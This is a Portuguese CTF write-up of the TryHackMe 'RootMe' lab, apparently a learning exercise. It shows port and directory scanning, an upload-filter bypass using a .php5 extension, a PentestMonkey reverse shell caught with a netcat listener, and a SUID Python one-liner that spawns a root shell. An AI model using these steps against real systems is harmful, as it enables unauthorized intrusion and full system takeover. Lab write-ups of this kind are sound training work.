---

# Write-up: TryHackMe - RootMe

Este laboratório consistia em um CTF focado em upload de arquivos maliciosos (Reverse Shell) e escalação de privilégios.

## 1. Reconhecimento (Recon)

Iniciei verificando os serviços rodando no alvo com o Nmap:

```bash
nmap -sS -T5 10.113.182.238
```
A varredura revelou duas portas abertas: a **22 (SSH)** e a **80 (HTTP)**, indicando um servidor web.

<img width="959" height="899" alt="Screenshot From 2026-11-20 23-47-29" src="https://github.com/user-attachments/assets/e4d9e706-c1f8-45d3-9a63-59886c7a7e04" />

Em seguida, utilizei o **Gobuster** para enumerar diretórios e arquivos no servidor web:

```bash
gobuster dir -u http://10.113.182.238 -w /usr/share/wordlists/Discovery/Web-Content/common.txt
```

A enumeração encontrou uma página `index.php`, o diretório `panel` (que continha a funcionalidade de upload) e o diretório `uploads` (onde os arquivos enviados ficam salvos).

<img width="959" height="958" alt="Screenshot From 2026-11-20 23-49-26" src="https://github.com/user-attachments/assets/4311427c-3a83-4206-9d13-0238b62185aa" />

## 2. Exploração (Upload e Reverse Shell)

Acessando o painel de upload, tentei enviar um arquivo PHP. Inicialmente, foi bloqueado, então alterei a extensão para `.php5`, o que passou pelo filtro de segurança:

<img width="900" height="899" alt="Screenshot From 2026-11-20 23-52-34" src="https://github.com/user-attachments/assets/db70ff75-c23c-4a2b-b2e2-5a90d7bc2cba" />

Como o upload foi bem-sucedido, criei um script de **Reverse Shell** (usando o script clássico do PentestMonkey). Antes de salvar, alterei o IP e a porta no código para apontar para a minha máquina:

```php
$ip = '192.168.134.8';  // Meu IP
$port = 9999;           // Porta de escuta
```

Utilizei o `nano` para editar o arquivo e, em seguida, subi-o:

<img width="959" height="312" alt="Screenshot From 2026-11-20 23-55-01" src="https://github.com/user-attachments/assets/16b025ef-1bd9-469c-a648-0c37d0d85a45" />

O arquivo estava disponível no diretório `/uploads`:

<img width="900" height="536" alt="Screenshot From 2026-11-20 23-56-06" src="https://github.com/user-attachments/assets/5aa92104-b23a-4a9d-84df-04e56f28ad72" />

Para receber a conexão, abri um listener na minha máquina atacante:

```bash
nc -lvnp 9999
```

Em seguida, acessei o arquivo malicioso pelo navegador (`http://10.113.182.238/uploads/php-reverse-shell.php5`). O servidor web executou o script e me enviou a shell!

<img width="900" height="420" alt="Screenshot From 2026-11-20 23-56-18" src="https://github.com/user-attachments/assets/a57d23b5-9c7e-46b3-b4ab-7973c7cf8ec2" />

## 3. Primeira Flag (User)

Já com a shell, procurei o arquivo `user.txt` no sistema e encontrei a primeira flag:

```bash
find / -name user.txt 2>/dev/null
cat /var/www/user.txt
```

<img width="950" height="100" alt="Screenshot From 2026-11-20 23-57-02" src="https://github.com/user-attachments/assets/61a7f0ef-f8e5-4f99-8731-6416f824ffaf" />
<img width="959" height="862" alt="Screenshot From 2026-11-20 23-58-04" src="https://github.com/user-attachments/assets/5bcf0dd8-ea4a-46fa-89e3-ab2cdae9c91d" />

## 4. Escalação de Privilégios (Root)

Para escalar privilégios, procurei por binários com o bit **SUID** ativado:

```bash
find / -user root -perm -4000 2>/dev/null
```

A saída revelou um binário incomum: `/usr/bin/python` com permissão SUID.

<img width="700" height="200" alt="Screenshot From 2026-11-20 23-58-20" src="https://github.com/user-attachments/assets/f58ef50c-5123-4bd2-9b1b-cc4d18ff50f2" />

Consultando o site **GTFOBins** na seção do Python, encontrei o comando exato para explorar essa falha e escalar para root:

<img width="907" height="651" alt="Screenshot From 2026-11-20 23-58-32" src="https://github.com/user-attachments/assets/4d5b125f-513e-47ef-aa1c-425b8995123d" />

Executei o comando e obtive acesso total como root:

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

<img width="900" height="300" alt="Screenshot From 2026-11-20 23-58-45" src="https://github.com/user-attachments/assets/6d0ee8e1-0c22-4f68-9a4c-b222a5f7f204" />

Por fim, li a flag de root:

```bash
cat /root/root.txt
```

<img width="934" height="486" alt="Screenshot From 2026-11-20 23-59-01" src="https://github.com/user-attachments/assets/86e1c553-87ce-4d74-a4dc-56a0eb8d4568" />

---
